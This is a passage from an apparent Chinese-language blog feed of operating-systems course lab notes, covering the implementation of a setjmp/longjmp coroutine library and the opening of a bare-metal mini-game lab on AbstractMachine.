class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">co_status</span> &#123;</span></span><br><span class="line">  CO_NEW = <span class="number">1</span>, <span class="comment">// 新创建，还未执行过</span></span><br><span class="line">  CO_RUNNING, <span class="comment">// 已经执行过</span></span><br><span class="line">  CO_WAITING, <span class="comment">// 在 co_wait 上等待</span></span><br><span class="line">  CO_DEAD,    <span class="comment">// 已经结束，但还未释放资源</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> K 1024</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STACK_SIZE (64 * K)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">co</span> &#123;</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">  <span class="type">void</span> (*func)(<span class="type">void</span> *); <span class="comment">// co_start 指定的入口地址和参数</span></span><br><span class="line">  <span class="type">void</span> *arg;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> <span class="title">co_status</span> <span class="title">status</span>;</span><span class="comment">// 协程的状态</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">co</span> *    <span class="title">waiter</span>;</span><span class="comment">// 是否有其他协程在等待当前协程</span></span><br><span class="line">  jmp_buf        context;<span class="comment">// 寄存器现场 (setjmp.h)</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> <span class="built_in">stack</span>[STACK_SIZE]; <span class="comment">// 协程的堆栈</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><h3 id="co-start函数的实现"><a href="#co-start函数的实现" class="headerlink" title="co_start函数的实现"></a><code>co_start</code>函数的实现</h3><p>  <code>co_start</code>的原理很简单，就是申请相关结构体，并且初始化各个字段即可，其代码如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> co *<span class="title function_">co_start</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name, <span class="type">void</span> (*func)(<span class="type">void</span> *), <span class="type">void</span> *arg)</span> &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">co</span> *<span class="title">coroutine</span> =</span> (<span class="keyword">struct</span> co*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> co));</span><br><span class="line">assert(coroutine);</span><br><span class="line"></span><br><span class="line">coroutine-&gt;name = name;</span><br><span class="line">coroutine-&gt;func = func;</span><br><span class="line">coroutine-&gt;arg = arg;</span><br><span class="line">coroutine-&gt;status = CO_NEW;</span><br><span class="line">coroutine-&gt;waiter = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">co_node_insert(coroutine);</span><br><span class="line"><span class="keyword">return</span> coroutine;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>  除此之外，为了方便管理，我们使用双向循环链表，将所有创建的<code>struct co</code>放入，相关的代码如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CONODE</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">co</span> *<span class="title">coroutine</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">CONODE</span> *<span class="title">fd</span>, *<span class="title">bk</span>;</span></span><br><span class="line">&#125; CoNode;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> CoNode *co_node = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 如果co_node == NULL，则创建一个新的双向循环链表即可，并返回</span></span><br><span class="line"><span class="comment"> * 如果co_node != NULL, 则在co_node和co_node-&gt;fd之间插入，仍然返回co_node的值</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">co_node_insert</span><span class="params">(<span class="keyword">struct</span> co *coroutine)</span> &#123;</span><br><span class="line">CoNode *victim = (CoNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(CoNode));</span><br><span class="line">assert(victim);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">victim-&gt;coroutine = coroutine;</span><br><span class="line"><span class="keyword">if</span>(co_node == <span class="literal">NULL</span>) &#123;</span><br><span class="line">victim-&gt;fd = victim-&gt;bk = victim;</span><br><span class="line">co_node = victim;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">victim-&gt;fd = co_node-&gt;fd;</span><br><span class="line">victim-&gt;bk = co_node;</span><br><span class="line">victim-&gt;fd-&gt;bk = victim-&gt;bk-&gt;fd = victim;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 如果当前只剩node一个，则返回该一个</span></span><br><span class="line"><span class="comment"> * 否则，拉取当前co_node对应的协程，并沿着bk方向移动</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> CoNode *<span class="title function_">co_node_remove</span><span class="params">()</span> &#123;</span><br><span class="line">CoNode *victim = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(co_node == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="literal">NULL</span>; &#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(co_node-&gt;bk == co_node) &#123;</span><br><span class="line">victim = co_node;</span><br><span class="line">co_node = <span class="literal">NULL</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">victim = co_node;</span><br><span class="line"></span><br><span class="line">co_node = co_node-&gt;bk;</span><br><span class="line">co_node-&gt;fd = victim-&gt;fd;</span><br><span class="line">co_node-&gt;fd-&gt;bk = co_node;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="co-yield函数的设计与实现"><a href="#co-yield函数的设计与实现" class="headerlink" title="co_yield函数的设计与实现"></a><code>co_yield</code>函数的设计与实现</h3><p>  在前面的指南中已经提到了，实际上<code>co_yield</code>函数，就是一个保存当前协程的上下文，并切换到选中的协程的上下文的过程。而由于我们前面使用双向循环链表保存当前所有的协程，因此通过沿着<code>co_node-&gt;bk</code>遍历，总可以找到一个协程，其状态为<code>CO_NEW</code>或<code>CO_RUNNING</code>(始终有调用<code>co_yield</code>的协程为待选中协程)，然后切换到该指定协程上并进行运行即可;<br>  根据前面的分析，由于选中的协程包含有<code>CO_NEW</code>和<code>CO_RUNNING</code>两种情况:</p><ol><li>选中的协程为<code>CO_RUNNING</code>，则选中的协程必然是执行过<code>co_yield</code>函数，保存了其上下文后被释放了CPU的协程。因此我们只需要调用<code>longjmp</code>函数，即立马恢复到选中的协程保存的上下文中。这里需要特别说明的是，当时保存的协程的上下文，其正在执行<code>co_yield</code>，也就是恢复上下文后，其下一条命令就是<code>setjmp</code>语句的紧接着的下一条，这也就是我们需要判断<code>setjmp</code>返回值的原因——根据返回值，判断当前执行的协程是刚保存完的协程;还是被选中后接着跳转过来的协程。这里有点类似于<code>fork</code>函数，需要特别注意以下</li><li><p>选中的协程为<code>CO_NEW</code>，则此时协程中的栈是空的，则此时不能像上面一样，直接跳转——因为其栈是空的，则并没有保存协程的上下文，自然是错误的。因此这里我们运行函数就行，也就是伪造好参数传递，然后直接<code>call</code>给定的函数即可。当然，<code>call</code>的话，其最终仍然会返回并继续执行下面的命令(如果函数是有限执行的话)。当协程执行完后，下面将其状态更改为<code>CO_DEAD</code>即可，并修改等待其结束的协程的状态，然后再次调用<code>co_yield</code>即可，切换到其他协程上，之后再也不会被选中执行，并等待<code>co_wait</code>释放相关资源即可。</p><p>选中的协程为<code>CO_NEW</code>下，其整体流程如下所示<br><img src="选中的协程为`CO_NEW`的流程.PNG" alt="选中的协程为`CO_NEW`的流程"><br>这里有几点需要注意的问题:</p><ul><li>由于M2开的是<code>O1</code>优化，因此首先修改协程状态为<code>CO_RUNNING</code>，然后又修改为<code>CO_DEAD</code>，会被编译器直接优化为最后一次覆写</li><li>当我们使用<code>call</code>调用了指定的函数后，其部分寄存器的值会被改变(如函数约定中调用者保存的寄存器)。而由于调用处的代码是我们自己内敛汇编实现的，因此需要自己实现相关寄存器的保存和恢复，避免影响后面的代码执行(也就是<code>stack_switch_call</code>和<code>restore_return</code>)</li></ul></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 切换栈，即让选中协程的所有堆栈信息在自己的堆栈中，而非调用者的堆栈。保存调用者需要保存的寄存器，并调用指定的函数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">stack_switch_call</span><span class="params">(<span class="type">void</span> *sp, <span class="type">void</span> *entry, <span class="type">void</span>* arg)</span> &#123;</span><br><span class="line"><span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">#<span class="keyword">if</span> __x86_64__</span></span><br><span class="line"><span class="params"><span class="string">&quot;movq %%rcx, 0(%0); movq %0, %%rsp; movq %2, %%rdi; call *%1&quot;</span></span></span><br><span class="line"><span class="params">: : <span class="string">&quot;b&quot;</span>((<span class="type">uintptr_t</span>)sp - <span class="number">16</span>), <span class="string">&quot;d&quot;</span>((<span class="type">uintptr_t</span>)entry), <span class="string">&quot;a&quot;</span>((<span class="type">uintptr_t</span>)arg)</span></span><br><span class="line"><span class="params">#<span class="keyword">else</span></span></span><br><span class="line"><span class="params"><span class="string">&quot;movl %%ecx, 4(%0); movl %0, %%esp; movl %2, 0(%0); call *%1&quot;</span></span></span><br><span class="line"><span class="params">: : <span class="string">&quot;b&quot;</span>((<span class="type">uintptr_t</span>)sp - <span class="number">8</span>), <span class="string">&quot;d&quot;</span>((<span class="type">uintptr_t</span>)entry), <span class="string">&quot;a&quot;</span>((<span class="type">uintptr_t</span>)arg) </span></span><br><span class="line"><span class="params">#endif</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 从调用的指定函数返回，并恢复相关的寄存器。此时协程执行结束，以后再也不会执行该协程的上下文。这里需要注意的是，其和上面并不是对称的，因为调用协程给了新创建的选中协程的堆栈，则选中协程以后就在自己的堆栈上执行，永远不会返回到调用协程的堆栈。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">restore_return</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">#<span class="keyword">if</span> __x86_64__</span></span><br><span class="line"><span class="params"><span class="string">&quot;movq 0(%%rsp), %%rcx&quot;</span> : : </span></span><br><span class="line"><span class="params">#<span class="keyword">else</span></span></span><br><span class="line"><span class="params"><span class="string">&quot;movl 4(%%esp), %%ecx&quot;</span> : :  </span></span><br><span class="line"><span class="params">#endif</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __LONG_JUMP_STATUS (1)</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">co_yield</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> status = setjmp(current-&gt;context);</span><br><span class="line"><span class="keyword">if</span>(!status) &#123;</span><br><span class="line"><span class="comment">//此时开始查找待选中的进程，因为co_node应该指向的就是current对应的节点，因此首先向下移动一个，使当前线程优先级最低</span></span><br><span class="line">co_node = co_node-&gt;bk;</span><br><span class="line"><span class="keyword">while</span>(!((current = co_node-&gt;coroutine)-&gt;status == CO_NEW || current-&gt;status == CO_RUNNING)) &#123; co_node = co_node-&gt;bk; &#125;</span><br><span class="line"></span><br><span class="line">assert(current);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(current-&gt;status == CO_RUNNING) &#123; longjmp(current-&gt;context, __LONG_JUMP_STATUS); &#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">((<span class="keyword">struct</span> co <span class="keyword">volatile</span>*)current)-&gt;status = CO_RUNNING;<span class="comment">//这里如果直接赋值，编译器会和后面的覆写进行优化</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 栈由高地址向低地址生长</span></span><br><span class="line">stack_switch_call(current-&gt;<span class="built_in">stack</span> + STACK_SIZE, current-&gt;func, current-&gt;arg);</span><br><span class="line"><span class="comment">//恢复相关寄存器</span></span><br><span class="line">restore_return();</span><br><span class="line"></span><br><span class="line"><span class="comment">//此时协程已经完成执行</span></span><br><span class="line">current-&gt;status = CO_DEAD;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(current-&gt;waiter) &#123; current-&gt;waiter-&gt;status = CO_RUNNING; &#125;</span><br><span class="line">co_yield();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">assert(status &amp;&amp; current-&gt;status == CO_RUNNING);<span class="comment">//此时一定是选中的进程通过longjmp跳转到的情况执行到这里</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="co-wait函数的设计与实现"><a href="#co-wait函数的设计与实现" class="headerlink" title="co_wait函数的设计与实现"></a><code>co_wait</code>函数的设计与实现</h3><p>  这个函数的实现就很简单——如果等待的协程的状态已经是<code>CO_DEAD</code>，则直接回收其资源就行;如果等待的协程的状态还不是<code>CO_DEAD</code>，则首先标记当前调用协程的状态为<code>CO_WAITING</code>，避免之后被选中执行，然后调用<code>co_yield</code>函数，让其他协程执行，直到待释放的协程执行完毕，唤醒调用协程(即修改其状态)为止<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">co_wait</span><span class="params">(<span class="keyword">struct</span> co *coroutine)</span> &#123;</span><br><span class="line">assert(coroutine);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(coroutine-&gt;status != CO_DEAD) &#123;</span><br><span class="line">coroutine-&gt;waiter = current;</span><br><span class="line">current-&gt;status = CO_WAITING;</span><br><span class="line">co_yield();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 释放coroutine对应的CoNode</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">while</span>(co_node-&gt;coroutine != coroutine) &#123; co_node = co_node-&gt;bk; &#125;</span><br><span class="line"></span><br><span class="line">assert(co_node-&gt;coroutine == coroutine);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(coroutine);</span><br><span class="line"><span class="built_in">free</span>(co_node_remove());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="全局构造函数"><a href="#全局构造函数" class="headerlink" title="全局构造函数"></a>全局构造函数</h3><p>  前面已经提到了，实际上最开始执行的<code>main</code>函数流，也是一个协程。因此我们需要在开始执行<code>main</code>之前，为其创建一个协程。这里定义<code>__attribute__((constructor))属性函数，从其申请一个协程即可  需要注意的是，和普通的协程不一样，实际上这个协程在创建的时候，就已经是</code>CO_RUNNING<code>的状态了，不需要在调用其他的函数了。因此我们创建完成后，将其</code>status`字段进行修改即可。<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __attribute__((constructor)) <span class="type">void</span> <span class="title function_">co_constructor</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"></span><br><span class="line">current = co_start(<span class="string">&quot;main&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">current-&gt;status = CO_RUNNING;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="全局析构函数"><a href="#全局析构函数" class="headerlink" title="全局析构函数"></a>全局析构函数</h3><p>  最后，当<code>main</code>函数执行结束后，所有协程都应该无条件结束。换句话说，也就是在<code>main</code>函数终止后，将所有的协程资源全部释放掉即可，也就是双向循环链接及其协程结构这些数据全部释放即可。这里同样通过<code>__attribute__((destructor))</code>属性的函数，执行上述操作即可<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __attribute__((destructor)) <span class="type">void</span> <span class="title function_">co_destructor</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"><span class="keyword">if</span>(co_node == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(co_node) &#123;</span><br><span class="line">current = co_node-&gt;coroutine;</span><br><span class="line"><span class="built_in">free</span>(current);</span><br><span class="line"><span class="built_in">free</span>(co_node_remove());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h2><p>  最后，在<strong>libco</strong>目录下，执行如下命令，生成协程的动态链接库<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make all</span><br></pre></td></tr></table></figure></p><p>  然后进入<strong>tests</strong>子目录，执行如下命令进行测试<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make <span class="built_in">test</span></span><br></pre></td></tr></table></figure></p><p>  最终测试结果如下所示<br>  <img src="测试结果.PNG" alt="测试结果"></p>]]></content>
      
      
      <categories>
          
          <category> 手写 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 手写 </tag>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统-设计与实现-二</title>
      <link href="/2021/08/01/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0-%E4%BA%8C/"/>
      <url>/2021/08/01/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0-%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>  这一章没有新的内容，仅仅是实现课程中的L0实验</p><h1 id="L0直接运行在硬件上的小游戏"><a href="#L0直接运行在硬件上的小游戏" class="headerlink" title="L0直接运行在硬件上的小游戏"></a>L0直接运行在硬件上的小游戏</h1><h2 id="实验背景"><a href="#实验背景" class="headerlink" title="实验背景"></a>实验背景</h2><p>  传统上，操作系统被认为就是”写汇编”、”跟底层打交道”。但实际上，操作系统和硬件之间的关系被夸大了。操作系统实际上不过就是一个直接运行在计算机上的(高级语言)程序而已，只是会在适当的时候调用操作系统提供的<strong>机制</strong>。<br>  因此，在初始化完成后设置好一个没有标准库的<strong>C</strong>程序运行环境，其中包含栈区、静态数据、堆区;代码从<code>main</code>函数开始执行，并允许我们在程序运行过程中直接、独占式地访问操作系统中的物理设备(例如显示器、计时器)和响应中断，即可实现当下主流的操作系统</p><h2 id="实验描述"><a href="#实验描述" class="headerlink" title="实验描述"></a>实验描述</h2><blockquote><p>实验要求1:实现AbstractMachine中klib中缺失的函数</p><blockquote><p><strong>AbstractMachine</strong>的项目中包含一个基础运行库的框架klib，其中包含了方便你编写<em>bare-metal</em>程序的系列库函数，例如<code>assert</code>、<code>printf</code>和<code>memcpy</code>等。<br>尽可能实现有能力实现的代码</p></blockquote><p>实验要求2:实现可移植的、直接运行在计算机硬件上的小游戏</p><blockquote><p>你需要编写一个直接运行在<strong>AbstractMachine</strong>上(仅仅是用IOE拓展，不使用其他硬件机制如中断/异常/虚拟存储/多处理器)的小游戏;满足:</p><ol><li>有肉眼可辨认的图形输出</li><li>能使用键盘与游戏交互</li><li>游戏使用的内存(代码、静态数据总和不超过1MiB、堆区_heap使用不超过1MiB)，因此不必考虑复杂的图形;</li><li>按ESC键后调用<code>_halt()</code>退出;除此之外游戏程序永不调用<code>_halt()</code>结束，Game Over后按键重新开始</li></ol><p>只要程序不崩溃，哪怕只有几个像素点在屏幕上乱动也可以。虽然不限制实现什么游戏，但仍需要在移植性/通用性上对代码做出一定的保证:</p><ul><li>兼容很简单的处理器:即小游戏运行中只调用<strong>TRM</strong>和<strong>IOE</strong> API，而不使用其他API</li><li>你的游戏应当是可以在多个硬件体系之间移植的，考虑兼容以下情况:<ul><li>适配不同的屏幕大小。不同的体系结构中，屏幕大小可能是320x200、640x480、800x600等，你的游戏最好都能在所有分辨率下都获得不错的体验;</li><li>同minilabs一样，你的程序可能运行在32/64-bit平台，因此你应当使用<code>intptr_t</code>或<code>uintptr_t</code>来保存指针数值;</li><li>兼容大/小端，因此禁止把不同大小的指针类型强制转换</li></ul></li></ul></blockquote></blockquote><h2 id="实验指南"><a href="#实验指南" class="headerlink" title="实验指南"></a>实验指南</h2><p>  根据前面的描述，整个实验由两个小实验构成—实现<strong>klib</strong>库函数;实现小游戏。这里给出这两个小实验需要注意的细节</p><h3 id="实现库函数"><a href="#实现库函数" class="headerlink" title="实现库函数"></a>实现库函数</h3><p>  实际上，实现库函数是普通的<strong>C</strong>语言练习题;但需要注意的是，编写可移植代码时，尽量使用<strong>C</strong>标准提供的机制，而非做一些对硬件的假设</p><h3 id="访问I-O设备"><a href="#访问I-O设备" class="headerlink" title="访问I/O设备"></a>访问I/O设备</h3><p>  没有库函数的C语言程序类似于状态机，仅仅可以完成纯粹的”计算”。我们可以通过<strong>TRM</strong>和<strong>IOE</strong>的API，与外界的I/O设备进行交互，从而完成相关的操作。</p><h3 id="实现游戏"><a href="#实现游戏" class="headerlink" title="实现游戏"></a>实现游戏</h3><p>  <strong>AbstractMachine</strong>中附带的<strong>AMGame</strong>使用了一种框架，这里再提供一个不同的框架，来实现游戏，如下所示<br>    <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">next_frame = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">  <span class="keyword">while</span> (uptime() &lt; next_frame) ; <span class="comment">// 等待一帧的到来</span></span><br><span class="line">  <span class="keyword">while</span> ((key = readkey()) != _KEY_NONE) &#123;</span><br><span class="line">    kbd_event(key);         <span class="comment">// 处理键盘事件</span></span><br><span class="line">  &#125;</span><br><span class="line">  game_progress();          <span class="comment">// 处理一帧游戏逻辑，更新物体的位置等</span></span><br><span class="line">  screen_update();          <span class="comment">// 重新绘制屏幕</span></span><br><span class="line">  next_frame += <span class="number">1000</span> / FPS; <span class="comment">// 计算下一帧的时间</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>  其使用<strong>轮询(polling)</strong>等待下一帧时刻的到来;等到帧时刻到来，就读取键盘按键并处理;然后模拟这一帧中游戏发生的事情即可。</p><h3 id="小游戏和操作系统"><a href="#小游戏和操作系统" class="headerlink" title="小游戏和操作系统"></a>小游戏和操作系统</h3><p>  实际上，游戏和操作系统的工作原理有很多相像的地方，正如前面介绍的，简化的游戏的<strong>主循环</strong>如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">  <span class="comment">// 在每一个时间片，例如每 16.7ms (60 fps)</span></span><br><span class="line">  wait_for_frame();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 做完这一个时间片内需要完成的工作</span></span><br><span class="line">  <span class="type">int</span> scanlines = <span class="number">262</span>;</span><br><span class="line">  <span class="keyword">while</span> (scanlines-- &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    ppu_cycle();      <span class="comment">// 更新游戏图像</span></span><br><span class="line">    psg_detect_key(); <span class="comment">// 读取按键，更新游戏逻辑</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>  而如果在程序的<strong>主循环</strong>中，不再是一次执行一帧，而是”每一帧”都执行另一个程序，程序执行完后返回主循环，则可以抽象为批处理系统的流程<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">  <span class="comment">// 等待键盘输入需要运行的命令</span></span><br><span class="line">  Job *job = wait_for_job();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 加载并执行命令</span></span><br><span class="line">  load(job);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>  有了上面的分析，可以简单的<strong>剧透</strong>一下<strong>批处理</strong>系统的工作流程</p><ol><li>批处理系统执行的命令由键盘输入，因此<code>wait_for_job()</code>就是从键盘读取按键，并解析成命令，与游戏读取按键类似</li><li>执行的命令(job)是保存在磁盘上的ELF格式的二进制文件，则使用硬件提供的I/O指令，将存储设备中二进制文件加载到内存中，然后在通过跳转，将控制权交给job;等job结束后函数返回，重新回到批处理系统，从而完成一个简易的操作系统，其<code>load()</code>部分的简化代码如下<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td 